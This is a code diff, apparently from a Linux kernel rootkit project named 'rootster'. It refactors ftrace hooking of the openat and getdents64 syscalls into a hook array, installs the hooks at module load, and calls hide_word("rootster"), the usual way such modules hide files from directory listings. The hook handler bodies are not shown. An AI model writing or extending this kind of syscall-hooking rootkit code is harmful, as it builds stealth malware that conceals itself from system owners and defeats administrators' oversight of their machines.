@@ -1,4 +1,6 @@
+#include "linux/array_size.h"
 #include "linux/kern_levels.h"
+#include "shared.h"
 #include "syscalls/getdents64.h"
 #include "syscalls/openat.h"
 #include <linux/dirent.h>
@@ -101,6 +103,9 @@ int fh_install_hook(struct ftrace_hook *hook) {
   return 0;
 }
 
+int fh_install_multiple_hooks(struct ftrace_hook *hook);
+int fh_install_multiple_hooks(struct ftrace_hook *hook) { return 0; }
+
 void fh_remove_hook(struct ftrace_hook *hook);
 void fh_remove_hook(struct ftrace_hook *hook) {
   int err;
@@ -116,19 +121,20 @@ void fh_remove_hook(struct ftrace_hook *hook) {
   }
 }
 
-struct ftrace_hook demo_openat_hook =
-    HOOK("__x64_sys_openat", openat_hook, &real_sys_openat);
-
-struct ftrace_hook demo_getdents_hook =
-    HOOK("__x64_sys_getdents64", getdents64_hook, &real_sys_getdents64);
+struct ftrace_hook hook_list[] = {
+    HOOK("__x64_sys_openat", openat_hook, &real_sys_openat),
+    HOOK("__x64_sys_getdents64", getdents64_hook, &real_sys_getdents64)};
 
 static int fh_init(void) {
   int err;
 
-  err = fh_install_hook(&demo_getdents_hook);
-  if (err)
-    return err;
+  hide_word("rootster");
 
+  for (int i = 0; i < ARRAY_SIZE(hook_list); i++) {
+    err = fh_install_hook(&hook_list[i]);
+    if (err)
+      return err;
+  }
   pr_info("#############################################################\n\n"
           "module loaded\n\n"
           "#############################################################\n");
@@ -138,7 +144,10 @@ static int fh_init(void) {
 module_init(fh_init);
 
 static void fh_exit(void) {
-  fh_remove_hook(&demo_getdents_hook);
+
+  for (int i = 0; i < ARRAY_SIZE(hook_list); i++) {
+    fh_remove_hook(&hook_list[i]);
+  }
 
   pr_info("#############################################################\n\n"
           "module unloaded\n\n"
